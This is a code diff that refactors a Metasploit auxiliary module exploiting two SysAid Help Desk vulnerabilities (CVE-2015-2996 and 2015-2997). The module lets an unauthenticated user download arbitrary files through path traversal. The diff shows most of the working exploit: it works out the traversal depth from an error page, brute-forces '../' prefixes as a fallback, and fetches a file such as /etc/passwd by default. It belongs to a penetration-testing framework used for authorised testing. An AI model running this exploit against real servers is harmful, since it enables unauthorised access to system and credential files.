@@ -12,7 +12,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "SysAid Help Desk Arbitrary File Download",
+      'Name'           => 'SysAid Help Desk Arbitrary File Download',
       'Description' => %q{
         This module exploits two vulnerabilities in SysAid Help Desk that allows
         an unauthenticated user to download arbitrary files from the system. First an
@@ -30,10 +30,10 @@ class Metasploit3 < Msf::Auxiliary
       'License' => MSF_LICENSE,
       'References' =>
         [
-          [ 'CVE', '2015-2996' ],
-          [ 'CVE', '2015-2997' ],
-          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ]
+          ['CVE', '2015-2996'],
+          ['CVE', '2015-2997'],
+          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt'],
+          ['URL', 'http://seclists.org/fulldisclosure/2015/Jun/8']
         ],
       'DisclosureDate' => 'Jun 3 2015'))
 
@@ -44,7 +44,6 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),
       ], self.class)
   end
-
 
   def get_traversal_path
     print_status("#{peer} - Trying to find out the traversal path...")
@@ -63,20 +62,17 @@ class Metasploit3 < Msf::Auxiliary
       }
     })
 
-    if res && res.code == 200
-      if res.body.to_s =~ /\<H2\>(.*)\<\/H2\>/
-        error_path = $1
-        # Error_path is something like:
-        # /var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../ajkdnjhdfn/1421678611732.zip
-        # This calculates how much traversal we need to do to get to the root.
-        position = error_path.index(large_traversal)
-        if position != nil
-          return "../" * (error_path[0,position].count('/') - 2)
-        end
+    if res && res.code == 200 && res.body.to_s =~ /\<H2\>(.*)\<\/H2\>/
+      error_path = $1
+      # Error_path is something like:
+      # /var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../ajkdnjhdfn/1421678611732.zip
+      # This calculates how much traversal we need to do to get to the root.
+      position = error_path.index(large_traversal)
+      unless position.nil?
+        return '../' * (error_path[0, position].count('/') - 2)
       end
     end
   end
-
 
   def download_file (download_path)
     begin
@@ -93,40 +89,38 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-
   def run
     # No point to continue if filepath is not specified
     if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
-      print_error("Please supply the path of the file you want to download.")
-      return
+      fail_with(Failure::BadConfig, 'Please supply the path of the file you want to download.')
+    end
+
+    print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
+    if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
+      file_path = $3
     else
-      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
-      if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
-        filepath = $3
-      else
-        filepath = datastore['FILEPATH']
-      end
+      file_path = datastore['FILEPATH']
     end
 
     traversal_path = get_traversal_path
-    if traversal_path == nil
+    if traversal_path.nil?
       print_error("#{peer} - Could not get traversal path, using bruteforce to download the file")
       count = 1
       while count < 15
-        res = download_file(("../" * count) + filepath)
-        if res && res.code == 200
-          if res.body.to_s.bytesize != 0
-            break
-          end
+        res = download_file(('../' * count) + file_path)
+        if res && res.code == 200  && res.body.to_s.bytesize != 0
+          break
         end
         count += 1
       end
     else
-      res = download_file(traversal_path[0,traversal_path.length - 1] + filepath)
+      res = download_file(traversal_path[0,traversal_path.length - 1] + file_path)
     end
 
     if res && res.code == 200
-      if res.body.to_s.bytesize != 0
+      if res.body.to_s.bytesize == 0
+        fail_with(Failure::NoAccess, "#{peer} - 0 bytes returned, file does not exist or it is empty.")
+      else
         vprint_line(res.body.to_s)
         fname = File.basename(datastore['FILEPATH'])
 
@@ -138,11 +132,9 @@ class Metasploit3 < Msf::Auxiliary
           fname
         )
         print_good("File saved in: #{path}")
-      else
-        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
       end
     else
-      print_error("#{peer} - Failed to download file.")
+      fail_with(Failure::Unknown, "#{peer} - Failed to download file.")
     end
   end
 end
